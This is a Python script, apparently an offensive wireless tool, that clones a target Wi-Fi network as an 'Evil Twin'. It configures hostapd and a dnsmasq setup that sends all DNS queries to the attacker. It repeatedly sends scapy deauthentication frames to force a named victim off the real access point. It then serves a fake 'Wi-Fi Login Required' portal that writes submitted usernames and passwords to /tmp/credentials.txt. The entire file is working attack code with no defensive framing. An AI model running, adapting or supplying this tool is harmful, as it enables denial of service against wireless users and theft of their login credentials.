import subprocess, time
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff, Dot11AssoReq
from threading import Thread, Event
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

# Event to stop deauth thread
_deauth_stop = Event()


def write_hostapd_conf(ap_iface, ssid, channel, path="hostapd.conf"):
    content = f"""\
interface={ap_iface}
driver=nl80211
ssid={ssid}
channel={channel}
hw_mode=g
auth_algs=1
ignore_broadcast_ssid=0
"""
    with open(path, 'w') as f:
        f.write(content)


def write_dnsmasq_conf(ap_iface, path="dnsmasq.conf"):
    content = f"""\
interface={ap_iface}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1 
dhcp-option=6,10.0.0.1 
address=/#/10.0.0.1 
no-resolv
server=8.8.8.8
bind-interfaces
"""
    with open(path, 'w') as f:
        f.write(content)


def create_evil_ap(ap_info, ap_iface):
    ssid    = ap_info['SSID']
    channel = ap_info['Channel']

    print("1) Stopping NetworkManager/other services…")
    subprocess.run(['airmon-ng', 'check', 'kill'], check=False)

    # ensure ap_iface exists (via init.sh) and is up
    subprocess.run(['ip', 'link', 'set', ap_iface, 'up'], check=True)

    # assign IP to ap_iface (so dnsmasq will bind)
    subprocess.run(['ip','addr','flush','dev',ap_iface], check=False)
    subprocess.run(['ip','addr','add','10.0.0.1/24','dev',ap_iface], check=True)

    # 3) Write configs
    write_hostapd_conf(ap_iface, ssid, channel, path="hostapd.conf")
    write_dnsmasq_conf(ap_iface, path="dnsmasq.conf")

    # 4) Launch dnsmasq with that conf
    print("4) Launching dnsmasq…")
    subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf'])

    time.sleep(0.5)  # let DNS/DHCP settle

    # 5) Launch hostapd as a daemon, log to hostapd.log
    print("5) Launching hostapd (daemonized)…")
    HOSTAPD = '/usr/bin/hostapd'  # use shutil.which('hostapd') if you like
    logf = open('hostapd.log', 'w')
    subprocess.Popen(
        ['hostapd', '-B', '-dd', 'hostapd.conf'],
        stdout=logf,
        stderr=subprocess.STDOUT
    )
    logf.close()
    print("  › hostapd started in background; see hostapd.log for details")

    print(f"Evil Twin '{ssid}' should now be broadcasting on {ap_iface}.")


def _deauth_loop(real_bssid, victim_mac, iface):
    """Continuously send deauth frames in chunks until stopped."""
    pkt = RadioTap()/Dot11(addr1=victim_mac, addr2=real_bssid, addr3=real_bssid)/Dot11Deauth(reason=7)
    while not _deauth_stop.is_set():
        # Send a burst of 50 deauth packets
        for _ in range(50):
            sendp(pkt, iface=iface, verbose=False)
            time.sleep(0.1)
        # Pause before next burst
        time.sleep(0.5)


def deauth_victim(ap_info, victim_mac, iface):
    """
    Start deauth attack and stop when victim associates to the Evil AP.
    Sends 50 deauth frames, waits 0.5s, repeats until association detected.
    """
    real_bssid = ap_info['BSSID']
    print(f"Starting deauth attack on {victim_mac}...")
    _deauth_stop.clear()
    # Launch deauth loop
    t = Thread(target=_deauth_loop, args=(real_bssid, victim_mac, iface), daemon=True)
    t.start()

    # Sniff for the victim's association to the Evil AP
    def assoc_filter(pkt):
        return pkt.haslayer(Dot11AssoReq) and pkt.addr2 == victim_mac and pkt.addr1 == real_bssid

    def assoc_handler(pkt):
        print(f"Detected association from {victim_mac} to Evil AP {real_bssid}. Stopping deauth.")
        _deauth_stop.set()

    # Blocks until assoc_filter returns True
    sniff(iface=iface, prn=assoc_handler, stop_filter=assoc_filter)
    t.join()
    print(f"Deauth attack ended for {victim_mac}")


def start_captive_portal(port=80):
    """
    Starts a simple captive portal on HTTP port 80 that captures credentials.
    """
    print("Starting captive portal...")
    class PortalHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            html = """
            <html><body>
              <h1>Wi-Fi Login Required</h1>
              <form method="POST">
                Username: <input name="username"><br>
                Password: <input type="password" name="password"><br>
                <input type="submit" value="Login">
              </form>
            </body></html>
            """
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())

        def do_POST(self):
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length).decode()
            data = urllib.parse.parse_qs(body)
            username = data.get('username', [''])[0]
            password = data.get('password', [''])[0]
            # Log creds
            with open('/tmp/credentials.txt', 'a') as f:
                f.write(f"{username}:{password}\n")
            print(f"Captured credentials: {username}:{password}")
            # Acknowledge
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(b"<html><body><h1>Login successful!</h1></body></html>")

    server = HTTPServer(('', port), PortalHandler)
    print(f"Captive portal running on port {port}")
    server.serve_forever()
